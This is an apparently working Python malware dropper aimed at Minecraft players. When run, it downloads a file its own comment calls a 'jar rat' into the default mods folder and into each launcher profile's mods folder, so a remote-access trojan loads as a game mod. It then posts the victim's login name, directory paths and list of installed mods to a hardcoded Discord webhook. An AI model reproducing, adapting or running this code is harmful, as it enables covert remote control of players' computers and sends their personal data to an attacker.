import os
import requests
import json

def download_and_save_mod(url, save_directory):
    file_name = os.path.basename(url)
    save_path = os.path.join(save_directory, file_name)
    os.makedirs(save_directory, exist_ok=True)
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, 'wb') as file:
            file.write(response.content)
        
        return save_path
    else:
        return None

def get_all_mods_names(directory):
    all_files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
    return all_files

def send_webhook_message(webhook_url, embed):
    user_name = os.getlogin()
    data = {
        'username': user_name,
        'avatar_url': 'https://media.discordapp.net/attachments/1211281395285102592/1211312968801976400/pink_mouse.png?ex=65f6f89c&is=65e4839c&hm=0043285a20b9cfa3c4c318051ebd3845201f311031b1a06039508fcbd6c2fe1d&=&format=webp&quality=lossless&width=584&height=606',
        'embeds': [embed],
    }
    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    return response.status_code

def mod():
    mod_url = "JAR_RAT_DOWNLAOD_LINK"                                                                           #url to jar rat download
    launcher_profiles_path = os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_profiles.json")
    with open(launcher_profiles_path, 'r') as file:
        launcher_profiles = json.load(file)

    original_mods_directory = os.path.join(os.getenv("APPDATA"), ".minecraft", "mods")
    downloaded_mod_path_original = download_and_save_mod(mod_url, original_mods_directory)

    embed = {
        'title': 'Neue Mod hinzugefügt',
        'description': '',
        'fields': []
    }

    if downloaded_mod_path_original:
        all_mods_names_original = get_all_mods_names(original_mods_directory)
        embed['description'] += f"**Standardverzeichnis:**\n```\n{original_mods_directory}\n```\n"
        embed['fields'].append({
            'name': 'Mod-Datei',
            'value': os.path.basename(downloaded_mod_path_original),
            'inline': False
        })
        embed['fields'].append({
            'name': 'Andere Mods im Verzeichnis',
            'value': ', '.join(all_mods_names_original),
            'inline': False
        })

    for profile_id, profile_data in launcher_profiles['profiles'].items():
        if 'gameDir' in profile_data:
            mods_directory = os.path.join(profile_data['gameDir'], "mods")
            downloaded_mod_path_profile = download_and_save_mod(mod_url, mods_directory)
            if downloaded_mod_path_profile:
                all_mods_names_profile = get_all_mods_names(mods_directory)
                embed['description'] += f"\n**Profil '{profile_data['name']}':**\n"
                embed['fields'].append({
                    'name': 'Verzeichnis',
                    'value': f"```\n{profile_data['gameDir']}\n```",
                    'inline': False
                })
                embed['fields'].append({
                    'name': 'Mod-Datei',
                    'value': os.path.basename(downloaded_mod_path_profile),
                    'inline': False
                })
                embed['fields'].append({
                    'name': 'Andere Mods im Verzeichnis',
                    'value': ', '.join(all_mods_names_profile),
                    'inline': False
                })

    webhook_url = "https://discord.com/api/webhooks/1219337477953945620/MHQwGQ91a2eB9R9tZpWA46PJyXPlN_sjTi-p52SpPwWcgwwsOTbdG8Fjnhp3ul2X511v"                                                                                 #WEBHOOK URL
    send_webhook_message(webhook_url, embed)

mod()
